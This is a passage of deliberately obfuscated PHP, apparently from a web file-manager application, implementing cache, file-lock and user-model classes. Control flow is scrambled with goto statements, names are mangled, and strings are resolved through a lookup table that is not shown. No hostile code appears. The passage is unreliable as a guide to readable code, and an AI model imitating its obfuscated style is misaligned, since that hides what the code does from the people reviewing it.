!0; } $B¨×Ö‚¢íß = get_path_father($eø‘Áù†Ò); goto FåŠ†Ç¨; B¬à²°Ì˜‘: $FŒ‘Ÿ¯¨’¥ =& $_SERVER[Ç³Íß¦Ó]; $eø‘Áù†Ò = $CÕÉ¸Æ»[$FŒ‘Ÿ¯¨’¥[76]]; if (in_array($CÕÉ¸Æ»[$FŒ‘Ÿ¯¨’¥[445]], $b¶˜ÇÍ–İ)) { return !1; } goto EÖ¼Ù›¾œÌ; FåŠ†Ç¨: if (IO::exist($B¨×Ö‚¢íß)) { $b¶˜ÇÍ–İ[] = $CÕÉ¸Æ»[$FŒ‘Ÿ¯¨’¥[445]]; return !1; } $FØù–¯ ®à = array($FŒ‘Ÿ¯¨’¥[783] => $CÕÉ¸Æ»[$FŒ‘Ÿ¯¨’¥[783]], $FŒ‘Ÿ¯¨’¥[76] => array($FŒ‘Ÿ¯¨’¥[379], "{$B¨×Ö‚¢íß}\45")); $eò—‘‘•Ä = Model($FŒ‘Ÿ¯¨’¥[748])->where($FØù–¯ ®à)->field($FŒ‘Ÿ¯¨’¥[446])->select(); goto Cçáğ¥ÌÅˆ; Cçáğ¥ÌÅˆ: $b¶˜ÇÍ–İ = array_merge($b¶˜ÇÍ–İ, array_to_keyvalue($eò—‘‘•Ä, $FŒ‘Ÿ¯¨’¥[33], $FŒ‘Ÿ¯¨’¥[445])); return !1; goto A©ß‚´—°Æ; A©ß‚´—°Æ: } private function _fileFilter($EŸÁ¾‡¬Ÿä) { $fƒéÉŸ¶„· =& $_SERVER[Ç³Íß¦Ó]; if (empty($EŸÁ¾‡¬Ÿä)) { return; } $Eæ»÷·ôæ² = array($fƒéÉŸ¶„·[445] => array($fƒéÉŸ¶„·[7], array_unique($EŸÁ¾‡¬Ÿä))); $A¾Øå˜¥’ = Model($fƒéÉŸ¶„·[791])->where($Eæ»÷·ôæ²)->field($fƒéÉŸ¶„·[394])->select(); foreach ($A¾Øå˜¥’ as $fó§—²¯ãÈ) { Model($fƒéÉŸ¶„·[791])->remove($fó§—²¯ãÈ[$fƒéÉŸ¶„·[394]], !1); } } private function storeIds() { $Cî™‡ÎèÖ =& $_SERVER[Ç³Íß¦Ó]; $fŠâ‹†–ŞÏ = Model($Cî™‡ÎèÖ[728])->listData(); $D“´ÚªÁÙî = array(); $Aã œ”²§— = $GLOBALS[$Cî™‡ÎèÖ[6]][$Cî™‡ÎèÖ[88]][$Cî™‡ÎèÖ[792]]; foreach ($fŠâ‹†–ŞÏ as $bï‡À¶ô†”) { $C—Æ–«Û½ = strtolower($bï‡À¶ô†”[$Cî™‡ÎèÖ[94]]); if (!isset($Aã œ”²§—[$C—Æ–«Û½])) { continue; } $EãƒÓ±À = $Cî™‡ÎèÖ[72] . (isset($Aã œ”²§—[$C—Æ–«Û½]) ? $Aã œ”²§—[$C—Æ–«Û½] : ucfirst($C—Æ–«Û½)); if (!class_exists($EãƒÓ±À)) { continue; } $D“´ÚªÁÙî[] = $bï‡À¶ô†”[$Cî™‡ÎèÖ[392]]; } return $D“´ÚªÁÙî; } } goto aí”°çãƒâ; aí”°çãƒâ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fœë†ğÆ—; fœÙ¦ë¸ßÛ: $d£‚½‰½Ùø = $GLOBALS[$bïñâç´çˆ[6]][$bïñâç´çˆ[346]]; $e‡†ÑÃ×Ñ‰ = $d£‚½‰½Ùø[$d£‚½‰½Ùø[$bïñâç´çˆ[793]]]; $FÉ¥»Á…Öî = $d£‚½‰½Ùø[$bïñâç´çˆ[794]]; goto F­˜ô†³Ü„; fœë†ğÆ—: $bïñâç´çˆ =& $_SERVER[Ç³Íß¦Ó]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fœÙ¦ë¸ßÛ; F­˜ô†³Ü„: switch ($d£‚½‰½Ùø[$bïñâç´çˆ[793]]) { case $bïñâç´çˆ[17]: self::$handle = Model($bïñâç´çˆ[795]); break; case $bïñâç´çˆ[796]: self::$handle = new CacheRedis($e‡†ÑÃ×Ñ‰, $FÉ¥»Á…Öî); break; case $bïñâç´çˆ[797]: self::$handle = new CacheMemcached($e‡†ÑÃ×Ñ‰, $FÉ¥»Á…Öî); break; case $bïñâç´çˆ[192]: self::$handle = new CacheFile($e‡†ÑÃ×Ñ‰, $FÉ¥»Á…Öî); break; default: break; } return self::$handle; goto Eóµ«­ÑÏµ; Eóµ«­ÑÏµ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Fõƒœ¤–) { if (is_array($Fõƒœ¤–) || is_object($Fõƒœ¤–)) { $Fõƒœ¤– = json_encode($Fõƒœ¤–); } $Fõƒœ¤– = rawurlencode($Fõƒœ¤–); return md5(KOD_SITE_ID . $_SERVER[Ç³Íß¦Ó][71] . $Fõƒœ¤–); } public static function get($d…ç¨‘×ñá, $a¬Øø¹Í = false) { $c¬ñœ˜ùÊ = self::key($d…ç¨‘×ñá); if ($a¬Øø¹Í) { return unserialize(self::init()->get($c¬ñœ˜ùÊ)); } if (!isset(self::$memoryCache[$c¬ñœ˜ùÊ])) { $a§˜¶¹ŠÖÕ = self::init()->get($c¬ñœ˜ùÊ); self::$memoryCache[$c¬ñœ˜ùÊ] = unserialize($a§˜¶¹ŠÖÕ); } return self::$memoryCache[$c¬ñœ˜ùÊ]; } public static function set($d¥Ï¥Ÿ†áâ, $D¹Õ„®‹ÏŠ, $D¿†Ş„¸‹¦ = false) { goto AÖ½«•‘äÎ; AÖ½«•‘äÎ: $cô…Ã’ŒÛ = self::key($d¥Ï¥Ÿ†áâ); if (isset(self::$memoryCache[$cô…Ã’ŒÛ]) && self::$memoryCache[$cô…Ã’ŒÛ] === $D¹Õ„®‹ÏŠ) { return !0; } if ($D¿†Ş„¸‹¦ === 0) { self::$memoryCache[$cô…Ã’ŒÛ] = $D¹Õ„®‹ÏŠ; return !0; } goto f’¹½“ƒœŠ; f’¹½“ƒœŠ: CacheLock::lock($d¥Ï¥Ÿ†áâ); $d‡ÁåÅ…¦× = self::init()->set($cô…Ã’ŒÛ, serialize($D¹Õ„®‹ÏŠ), $D¿†Ş„¸‹¦); self::$memoryCache[$cô…Ã’ŒÛ] = $D¹Õ„®‹ÏŠ; goto B°Ï“ÈÁ¤; B°Ï“ÈÁ¤: CacheLock::unlock($d¥Ï¥Ÿ†áâ); return $d‡ÁåÅ…¦×; goto e¥½†ÍŞ·Ë; e¥½†ÍŞ·Ë: } public static function getCall($dçøë……÷¿, $DÙÕ‹ËÉø, $Eˆ„…“½¸, $Bá¹†åî–— = array()) { $FØ¢œ­Ñ™Ê = self::get($dçøë……÷¿); if ($FØ¢œ­Ñ™Ê) { return $FØ¢œ­Ñ™Ê; } $FØ¢œ­Ñ™Ê = call_user_func_array($Eˆ„…“½¸, $Bá¹†åî–—); self::set($dçøë……÷¿, $FØ¢œ­Ñ™Ê, $DÙÕ‹ËÉø); return $FØ¢œ­Ñ™Ê; } public static function remove($fÈ»§É¶Øµ) { goto Eö¦µ†ŠÑ; Eö¦µ†ŠÑ: $BÔçò¬¨ìÎ = self::key($fÈ»§É¶Øµ); unset(self::$memoryCache[$BÔçò¬¨ìÎ]); self::clearTimeout(); goto DËÎ·—˜§Ñ; D½Ã ¢ÁğÏ: return $CŸëÌ¨£Öõ; goto A‰ÏÂ¤¯ƒ; DËÎ·—˜§Ñ: CacheLock::lock($fÈ»§É¶Øµ); $CŸëÌ¨£Öõ = self::init()->remove($BÔçò¬¨ìÎ); CacheLock::unlock($fÈ»§É¶Øµ); goto D½Ã ¢ÁğÏ; A‰ÏÂ¤¯ƒ: } public static function removeMemory($F³­²Í”—³) { $Eï÷¬‹‘  = self::key($F³­²Í”—³); unset(self::$memoryCache[$Eï÷¬‹‘ ]); } public static function clearMemory($aÀÍäôƒ˜³ = false) { if ($aÀÍäôƒ˜³) { $aÀÍäôƒ˜³ = self::key($aÀÍäôƒ˜³); unset(self::$memoryCache[$aÀÍäôƒ˜³]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ç³Íß¦Ó][798])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ç³Íß¦Ó][799])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($AÇÈèŒ’ÈÌ, $cøñğèà) { $AŸšâá‡Õ =& $_SERVER[Ç³Íß¦Ó]; $this->cachePath = $AÇÈèŒ’ÈÌ[$AŸšâá‡Õ[76]]; $this->prefix = $AŸšâá‡Õ[800]; $this->cacheTime = $cøñğèà; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($A°äØß¬Æ½) { $c×Å˜õÆ¾ =& $_SERVER[Ç³Íß¦Ó]; $A°äØß¬Æ½ = str_replace(array($c×Å˜õÆ¾[801], $c×Å˜õÆ¾[97], $c×Å˜õÆ¾[70]), $c×Å˜õÆ¾[802], $A°äØß¬Æ½); return $this->cachePath . $c×Å˜õÆ¾[803] . $A°äØß¬Æ½ . $c×Å˜õÆ¾[804]; } public function set($D™¬ªƒà‚, $e¢„ë…Ç³É, $CŠÃ¬ŠÙ©Œ = false) { $AåËíØ©¥ = $this->getFile($D™¬ªƒà‚); if (file_put_contents($AåËíØ©¥, $this->prefix . $e¢„ë…Ç³É, LOCK_EX)) { return !0; } @unlink($AåËíØ©¥); return !1; } public function get($AìÉŠùáÔô) { $d„¤ÙÈéÆÑ = $this->getFile($AìÉŠùáÔô); if (file_exists($d„¤ÙÈéÆÑ) && filemtime($d„¤ÙÈéÆÑ) < time() - $this->cacheTime) { @unlink($d„¤ÙÈéÆÑ); return !1; } $Bˆ¶ëåÎ = @file_get_contents($d„¤ÙÈéÆÑ); return substr($Bˆ¶ëåÎ, strlen($this->prefix)); } public function remove($eíšã„è) { $c®ÖÌÃ±ãŒ = $this->getFile($eíšã„è); return @unlink($c®ÖÌÃ±ãŒ); } public function deleteAll() { $Cîºßòø˜§ =& $_SERVER[Ç³Íß¦Ó]; $A§Úç³á× = scandir($this->cachePath); foreach ($A§Úç³á× as $dª™… íùá) { $eÆï×ôÆ£š = $this->cachePath . $dª™… íùá; if (strpos($eÆï×ôÆ£š, $Cîºßòø˜§[804]) && strpos($eÆï×ôÆ£š, $Cîºßòø˜§[805])) { @unlink($eÆï×ôÆ£š); } } } public function clearTimeout() { $aô£Âğ¹‘ˆ =& $_SERVER[Ç³Íß¦Ó]; $b„ÛŸÊŠÍš = scandir($this->cachePath); foreach ($b„ÛŸÊŠÍš as $F¬Ş¸‚ğ‡¿) { $d×“Ï½ó‹Û = $this->cachePath . $F¬Ş¸‚ğ‡¿; if (strpos($d×“Ï½ó‹Û, $aô£Âğ¹‘ˆ[804]) && strpos($d×“Ï½ó‹Û, $aô£Âğ¹‘ˆ[805]) && filemtime($d×“Ï½ó‹Û) < time() - $this->cacheTime) { @unlink($d×“Ï½ó‹Û); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c«ˆë¯‹êÓ; c«ˆë¯‹êÓ: $aÙˆÖâòñ =& $_SERVER[Ç³Íß¦Ó]; if (self::$handle) { return self::$handle; } $B„¬áôğÛ‡ = $GLOBALS[$aÙˆÖâòñ[6]][$aÙˆÖâòñ[346]]; goto e„ÚÕ±Ö¯‚; e„ÚÕ±Ö¯‚: self::$timeout = $B„¬áôğÛ‡[$aÙˆÖâòñ[806]] ? $B„¬áôğÛ‡[$aÙˆÖâòñ[806]] : 10; $cÕÕ‹Ä‹Ğ = _get($GLOBALS[$aÙˆÖâòñ[6]], $aÙˆÖâòñ[807]); $D¦ÓÖš¶„ = $B„¬áôğÛ‡[$aÙˆÖâòñ[793]] ? $B„¬áôğÛ‡[$aÙˆÖâòñ[793]] : $aÙˆÖâòñ[192]; goto a°”ÖŸ’í; a°”ÖŸ’í: if ($D¦ÓÖš¶„ == $aÙˆÖâòñ[17] && $cÕÕ‹Ä‹Ğ == $aÙˆÖâòñ[9]) { $D¦ÓÖš¶„ = $aÙˆÖâòñ[192]; } switch ($D¦ÓÖš¶„) { case $aÙˆÖâòñ[796]: self::$handle = new CacheLockRedis(); break; case $aÙˆÖâòñ[797]: self::$handle = new CacheLockMemcached(); break; case $aÙˆÖâòñ[17]: self::$handle = new CacheLockDatabase(); break; case $aÙˆÖâòñ[192]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fµ¤Òç­ö; fµ¤Òç­ö: } private static function key($D†Š‰Ü) { return $_SERVER[Ç³Íß¦Ó][808] . Cache::key($D†Š‰Ü); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($b …†Ş¶åÕ = '') { self::$errorMsg = $b …†Ş¶åÕ; } public static function lockGlobal($e¦Á´î’¦æ, $e‡Øà²•¤œ) { return self::lock($e¦Á´î’¦æ, $e‡Øà²•¤œ, !0); } public static function lock($f˜ãÒ†ÑŒˆ, $F¢¯‰âßè = false, $aäöô¯•²‰ = false) { goto b»½‚ˆç£à; b»½‚ˆç£à: $f£²ˆ¥ØœÔ =& $_SERVER[Ç³Íß¦Ó]; $FÄí‡ÚÇĞ = self::init(); $dß±˜±™ = self::key($f˜ãÒ†ÑŒˆ); goto FÇæ¿’¡Ó; FÇæ¿’¡Ó: $F¢¯‰âßè = $F¢¯‰âßè ? $F¢¯‰âßè : self::$timeout; $c¬Æ´Ş§‘† = $FÄí‡ÚÇĞ->lock($dß±˜±™, $F¢¯‰âßè); if (!$c¬Æ´Ş§‘†) { $aç´´‹İò = "\154\x6f\x63\x6b\x20\x65\162\x72\x6f\162\73\x6b\145\x79\x3d{$f˜ãÒ†ÑŒˆ}\73\164\151\x6d\x65\75{$F¢¯‰âßè}\x3b" . self::$errorMsg . $f£²ˆ¥ØœÔ[68] . get_caller_msg(); $CÆÒ—äŸ© = LNG($f£²ˆ¥ØœÔ[809]) . "\x28{$F¢¯‰âßè}\x73\51\56" . LNG($f£²ˆ¥ØœÔ[810]); $CÆÒ—äŸ© .= $f£²ˆ¥ØœÔ[811]; if (is_string(self::$errorMsg) && self::$errorMsg) { $CÆÒ—äŸ© = $CÆÒ—äŸ© . $f£²ˆ¥ØœÔ[812] . self::$errorMsg; } write_log($aç´´‹İò, $f£²ˆ¥ØœÔ[813]); show_json($CÆÒ—äŸ©, !1); } goto aŞ„©… ß¤; aŞ„©… ß¤: if (!$aäöô¯•²‰) { self::$lockItem[$dß±˜±™] = !0; } return $c¬Æ´Ş§‘†; goto fï•ÑçÕåÄ; fï•ÑçÕåÄ: } public static function lockGet($AäÔö–Ê×—) { $e­›‰‰¶òŒ = self::key($AäÔö–Ê×—); if (self::$lockItem[$e­›‰‰¶òŒ]) { return self::$lockItem[$e­›‰‰¶òŒ]; } return self::init()->lockGet($e­›‰‰¶òŒ); } public static function unlock($FîŒ¹ÛŞ¼) { $fÑ“×¸¬ƒğ = self::key($FîŒ¹ÛŞ¼); self::$lockItem[$fÑ“×¸¬ƒğ] = null; return self::init()->unlock($fÑ“×¸¬ƒğ); } public static function unlockRuntime() { $Bä‡±´Îê£ =& $_SERVER[Ç³Íß¦Ó]; $E¢‚Ôˆ‘éÊ = self::init(); $aéé¹šÔÕ = !1; foreach (self::$lockItem as $A¶‚ÎÊ³¹õ => $cˆäì™«ø¥) { if (!$cˆäì™«ø¥) { continue; } $E¢‚Ôˆ‘éÊ->unlock($A¶‚ÎÊ³¹õ); if (!$aéé¹šÔÕ) { $aéé¹šÔÕ = !0; write_log($Bä‡±´Îê£[814] . $A¶‚ÎÊ³¹õ . $Bä‡±´Îê£[68] . get_caller_msg(), $Bä‡±´Îê£[813]); continue; } write_log($Bä‡±´Îê£[814] . $A¶‚ÎÊ³¹õ, $Bä‡±´Îê£[813]); } self::fileUnlockAll(); } public static function fileLock($b‚ÉÌì®À„) { goto BĞ¦ÀÖ†¼; E›Ş²ÁÛ‹: return !1; goto B®‡³å™æ˜; FàËø¸÷Ó„: if (flock($féÅ‹ß§, LOCK_EX)) { return !0; } self::unlock($b‚ÉÌì®À„); show_json($F¸à‰ê°ˆÙ[818], !1); goto E›Ş²ÁÛ‹; BĞ¦ÀÖ†¼: $F¸à‰ê°ˆÙ =& $_SERVER[Ç³Íß¦Ó]; if (!$GLOBALS[$F¸à‰ê°ˆÙ[815]]) { $GLOBALS[$F¸à‰ê°ˆÙ[815]] = array(); } $GLOBALS[$F¸à‰ê°ˆÙ[815]][$b‚ÉÌì®À„] = !1; goto C„˜Œ¼í—‰; C„˜Œ¼í—‰: $féÅ‹ß§ = fopen(DATA_PATH . $b‚ÉÌì®À„ . $F¸à‰ê°ˆÙ[816], $F¸à‰ê°ˆÙ[817]); if (!$féÅ‹ß§) { return !1; } $GLOBALS[$F¸à‰ê°ˆÙ[815]][$b‚ÉÌì®À„] = $féÅ‹ß§; goto FàËø¸÷Ó„; B®‡³å™æ˜: } public static function fileUnlock($bóÏöÆ–¸‰) { $Bë…¦¼áæë =& $_SERVER[Ç³Íß¦Ó]; $c”» †ˆ› = $GLOBALS[$Bë…¦¼áæë[815]][$bóÏöÆ–¸‰]; if (!$c”» †ˆ›) { return; } $GLOBALS[$Bë…¦¼áæë[815]][$bóÏöÆ–¸‰] = !1; flock($c”» †ˆ›, LOCK_UN); fclose($c”» †ˆ›); } public static function fileUnlockAll() { $cÖõ°Ñ½«ç =& $_SERVER[Ç³Íß¦Ó]; if (!$GLOBALS[$cÖõ°Ñ½«ç[815]]) { return; } foreach ($GLOBALS[$cÖõ°Ñ½«ç[815]] as $Fñ•ÉÉ…Ñ => $e„¾øöù¢¹) { if (!$e„¾øöù¢¹) { continue; } $GLOBALS[$cÖõ°Ñ½«ç[815]][$Fñ•ÉÉ…Ñ] = !1; flock($e„¾øöù¢¹, LOCK_UN); fclose($e„¾øöù¢¹); } $GLOBALS[$cÖõ°Ñ½«ç[815]] = array(); } } goto cõÕ´å£æ…; A½ô§Ÿ¥®: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\152\157\x62\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\144\145\x73\143", "\163\157\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\x62\114\151\163\164"; public function listData($dÎŸğ›Ù¦İ = false, $eÎ¿ÛƒÜ¢¡ = "\x73\x6f\x72\x74", $c ÃË’ø„ğ = false) { return parent::listData($dÎŸğ›Ù¦İ, $eÎ¿ÛƒÜ¢¡, $c ÃË’ø„ğ); } public function remove($F°˜ÈğÆé´) { return parent::remove($F°˜ÈğÆé´); } public function add($A˜òÒ‰İ¸) { $Bï£Ñ¥”ƒ =& $_SERVER[Ç³Íß¦Ó]; if ($this->findByName($A˜òÒ‰İ¸[$Bï£Ñ¥”ƒ[28]])) { return !1; } $A˜òÒ‰İ¸[$Bï£Ñ¥”ƒ[1712]] = $this->getSort(); return parent::insert($A˜òÒ‰İ¸); } private function getSort() { $Eäï²¢ê£› =& $_SERVER[Ç³Íß¦Ó]; $fŠ÷‰Å†ñ = parent::listData(); $cÃæá†½±Ã = array_to_keyvalue($fŠ÷‰Å†ñ, $Eäï²¢ê£›[33], $Eäï²¢ê£›[1712]); return empty($cÃæá†½±Ã) ? 0 : max($cÃæá†½±Ã) + 1; } public function update($eÀ¥‹®‘‰, $a¡¸•èÁ‡) { $EÖ›ˆ‘àó =& $_SERVER[Ç³Íß¦Ó]; $bŸºõµ•’ = parent::listData($eÀ¥‹®‘‰); $eö«½¥¥ïˆ = $this->findByName($a¡¸•èÁ‡[$EÖ›ˆ‘àó[28]]); if (!$bŸºõµ•’ || $eö«½¥¥ïˆ && $eö«½¥¥ïˆ[$EÖ›ˆ‘àó[392]] != $bŸºõµ•’[$EÖ›ˆ‘àó[392]]) { return !1; } return parent::update($eÀ¥‹®‘‰, $a¡¸•èÁ‡); } public function setUserJob($FØïˆñ‰Í, $FÙÁƒã’çÀ) { goto d³†ÆˆƒÑÔ; d³†ÆˆƒÑÔ: $eºÙ¡‚Ú =& $_SERVER[Ç³Íß¦Ó]; if (!is_array($FÙÁƒã’çÀ)) { $FÙÁƒã’çÀ = array($FÙÁƒã’çÀ); } $a»Û´ò½Çç = parent::listData(); goto CáØ‘êÆœ¤; E¨²¦·ó ˆ: $fğÈ…¬¬– = rtrim($fğÈ…¬¬–, $eºÙ¡‚Ú[47]); Model($eºÙ¡‚Ú[505])->metaSet($FØïˆñ‰Í, self::JOB_KEY, $fğÈ…¬¬–); goto DÖèõ—ÕäÓ; CáØ‘êÆœ¤: $BÎàÍ¸Û‚ª = array_to_keyvalue($a»Û´ò½Çç, $eºÙ¡‚Ú[28]); $fğÈ…¬¬– = $eºÙ¡‚Ú[374]; foreach ($FÙÁƒã’çÀ as $Dì‰òá—ç‚) { if ($BÎàÍ¸Û‚ª[$Dì‰òá—ç‚]) { $fğÈ…¬¬– .= $BÎàÍ¸Û‚ª[$Dì‰òá—ç‚][$eºÙ¡‚Ú[392]] . $eºÙ¡‚Ú[47]; } else { $e¶Òš˜äÏÎ = $this->add($Dì‰òá—ç‚); $fğÈ…¬¬– .= $e¶Òš˜äÏÎ . $eºÙ¡‚Ú[47]; } } goto E¨²¦·ó ˆ; DÖèõ—ÕäÓ: } public function getUserJob($bÚ »¡ø¬) { $a³¥µ©”  = Model($_SERVER[Ç³Íß¦Ó][505])->metaGet($bÚ »¡ø¬); return $this->getUserJobInfo($a³¥µ©” [self::JOB_KEY]); } public function getUserJobInfo($c¬ö‘“¤±±) { goto Aêš´ŸÎ×; Aêš´ŸÎ×: $a‹ƒÕ‡øŒ =& $_SERVER[Ç³Íß¦Ó]; $f‘ƒƒ¨ğ¯× = explode($a‹ƒÕ‡øŒ[47], $c¬ö‘“¤±±); $E°í¸«•¤Ç = parent::listData(); goto Eˆáâ¯Ø›÷; Eˆáâ¯Ø›÷: $E°í¸«•¤Ç = array_remove_key($E°í¸«•¤Ç, $a‹ƒÕ‡øŒ[193]); $EŒÅËœàí• = array(); foreach ($f‘ƒƒ¨ğ¯× as $bòçƒË••Æ) { if (isset($E°í¸«•¤Ç[$bòçƒË••Æ])) { $EŒÅËœàí•[] = $E°í¸«•¤Ç[$bòçƒË••Æ]; } } goto Eà†Îí³¤À; Eà†Îí³¤À: return $EŒÅËœàí•; goto Dˆ¾ö¡è´Ã; Dˆ¾ö¡è´Ã: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\x65" => "\165\163\x65\x72\x5f\155\145\x74\x61", "\155\x65\x74\x61\106\151\145\154\x64" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\x73\x65\x72\x49\104\54\x6e\151\143\x6b\x4e\x61\155\x65\x2c\156\141\x6d\x65\x2c\x61\166\x61\164\141\x72\54\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($E‡Î™Ú—á) { $B’Ì§Ç’£ğ =& $_SERVER[Ç³Íß¦Ó]; $CÌÎƒ‡ïÂ× = $B’Ì§Ç’£ğ[2111]; return array($B’Ì§Ç’£ğ[1759] => array($E‡Î™Ú—á[0], $CÌÎƒ‡ïÂ×), $B’Ì§Ç’£ğ[1761] => array($E‡Î™Ú—á[0], $CÌÎƒ‡ïÂ×), $B’Ì§Ç’£ğ[2112] => array($E‡Î™Ú—á[0], $CÌÎƒ‡ïÂ×)); } protected function getInfo($DÒÔ§—‚Íç, $aôéóÜ„ª· = false) { $a‚¥™‚¸×á = $this->getInfoSimple($DÒÔ§—‚Íç); if (!is_array($a‚¥™‚¸×á)) { return array(); } if ($aôéóÜ„ª·) { return $this->_getInfoApply($a‚¥™‚¸×á); } return $this->cacheFunctionGet($_SERVER[Ç³Íß¦Ó][1768], $DÒÔ§—‚Íç); } protected function getInfoFull($e•ó†Û‰±ò, $bâéÖâÈÕÊ = false) { $Dõ›„·÷á˜ = $this->getInfoSimple($e•ó†Û‰±ò); if (!is_array($Dõ›„·÷á˜)) { return array(); } if ($bâéÖâÈÕÊ) { return $this->_getInfoApply($Dõ›„·÷á˜, !0); return $this->_getInfoApply($Dõ›„·÷á˜, !0); } return $this->cacheFunctionGet($_SERVER[Ç³Íß¦Ó][2113], $e•ó†Û‰±ò); } private function _getInfoApply($a¾ÅĞÓÏ, $eø»ªğ–„ = false) { goto AÜÌß™–¹; AÜÌß™–¹: $DÎÓÑ‰òÈÚ =& $_SERVER[Ç³Íß¦Ó]; if (!$a¾ÅĞÓÏ) { return $a¾ÅĞÓÏ; } $CÁÒÀ‰òÔ„ = md5($DÎÓÑ‰òÈÚ[2114] . $a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[849]] . $DÎÓÑ‰òÈÚ[2115] . $a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[28]]); goto a±‘ÕÄ‘†õ; a±‘ÕÄ‘†õ: $a¾ÅĞÓÏ = $this->_listDataApplyItem($a¾ÅĞÓÏ); $dãÏè—Á½ó = Model($DÎÓÑ‰òÈÚ[1204])->metaGet($a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[85]][$DÎÓÑ‰òÈÚ[394]]); $a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[2116]] = $CÁÒÀ‰òÔ„; goto F¬’·šøë; F¬’·šøë: $a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[85]][$DÎÓÑ‰òÈÚ[1949]] = isset($dãÏè—Á½ó[$DÎÓÑ‰òÈÚ[1950]]) ? $dãÏè—Á½ó[$DÎÓÑ‰òÈÚ[1950]] : null; if ($eø»ªğ–„) { $a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[443]] = $this->metaGet($a¾ÅĞÓÏ[$DÎÓÑ‰òÈÚ[1526]]); } return $a¾ÅĞÓÏ; goto E²šÀøñ„; E²šÀøñ„: } protected function getInfoSimple($D”ğ±é›ó, $A’«‡‡ƒ = false) { $bÖ†÷¶²¼Š =& $_SERVER[Ç³Íß¦Ó]; if (!$D”ğ±é›ó) { return array(); } if ($A’«‡‡ƒ) { $Bêİ—º´ã„ = $this->where(array($bÖ†÷¶²¼Š[1526] => intval($D”ğ±é›ó)))->find(); if (!is_array($Bêİ—º´ã„)) { return array(); } $Bêİ—º´ã„[$bÖ†÷¶²¼Š[2117]] = Action($bÖ†÷¶²¼Š[2118])->parseUrl($Bêİ—º´ã„[$bÖ†÷¶²¼Š[2117]]); return $Bêİ—º´ã„; } return $this->cacheFunctionGet($bÖ†÷¶²¼Š[1762], $D”ğ±é›ó); } protected function getInfoSimpleOuter($f¹™Ô©¹Ì°) { goto aÛĞ†ùá”Æ; aŸ”‡¡Ç¡: return $eÑÚ‡Æƒ‰; goto CÁçÈ©½£è; aÛĞ†ùá”Æ: $B­ğ†ø¡¶ =& $_SERVER[Ç³Íß¦Ó]; if (!$f¹™Ô©¹Ì° || $f¹™Ô©¹Ì° == 0) { return array($B­ğ†ø¡¶[1526] => $B­ğ†ø¡¶[495], $B­ğ†ø¡¶[28] => $B­ğ†ø¡¶[160] . LNG($B­ğ†ø¡¶[2119]) . $B­ğ†ø¡¶[503], $B­ğ†ø¡¶[2117] => STATIC_PATH . $B­ğ†ø¡¶[2120]); } $B¢Ş´ÊÑƒô = $this->cacheFunctionGet($B­ğ†ø¡¶[1762], $f¹™Ô©¹Ì°); goto dÍ’ëÕÔŠÄ; dÍ’ëÕÔŠÄ: $eÑÚ‡Æƒ‰ = array_field_key($B¢Ş´ÊÑƒô, explode($B­ğ†ø¡¶[47], $this->simpleField)); if (!$eÑÚ‡Æƒ‰) { return array($B­ğ†ø¡¶[1526] => $B­ğ†ø¡¶[1085], $B­ğ†ø¡¶[28] => $B­ğ†ø¡¶[160] . LNG($B­ğ†ø¡¶[2121]) . $B­ğ†ø¡¶[503], $B­ğ†ø¡¶[2117] => STATIC_PATH . $B­ğ†ø¡¶[2122]); } $eÑÚ‡Æƒ‰[$B­ğ†ø¡¶[2117]] = Action($B­ğ†ø¡¶[2118])->parseUrl($eÑÚ‡Æƒ‰[$B­ğ†ø¡¶[2117]]); goto aŸ”‡¡Ç¡; CÁçÈ©½£è: } protected function groupUser($DÖ±¿ì²œº) { } public static function errorLang($fŸİ»‚’ÓÚ) { $c‚£œÆìº =& $_SERVER[Ç³Íß¦Ó]; $Cä‰„‹Ç¬¯ = array(self::ERROR_USER_NOT_EXISTS => $c‚£œÆìº[2123], self::ERROR_USER_PASSWORD_ERROR => $c‚£œÆìº[2124], self::ERROR_USER_EXIST_NAME => $c‚£œÆìº[2125], self::ERROR_USER_EXIST_PHONE => $c‚£œÆìº[2126], self::ERROR_USER_EXIST_EMAIL => $c‚£œÆìº[2127], self::ERROR_USER_LOGIN_LOCK => $c‚£œÆìº[2128], self::ERROR_IP_NOT_ALLOW => $c‚£œÆìº[2129], self::ERROR_USER_EXIST_NICKNAME => $c‚£œÆìº[2130]); return LNG($Cä‰„‹Ç¬¯[$fŸİ»‚’ÓÚ]); } public function getInfoByMeta($F²°”ˆãÙ, $a»Ñ³…Åˆˆ) { $E® öÑİï› =& $_SERVER[Ç³Íß¦Ó]; $E‡Òº¦­ = Model($E® öÑİï›[2131])->where(array($E® öÑİï›[93] => $F²°”ˆãÙ, $E® öÑİï›[371] => $a»Ñ³…Åˆˆ))->find(); if ($E‡Òº¦­) { return 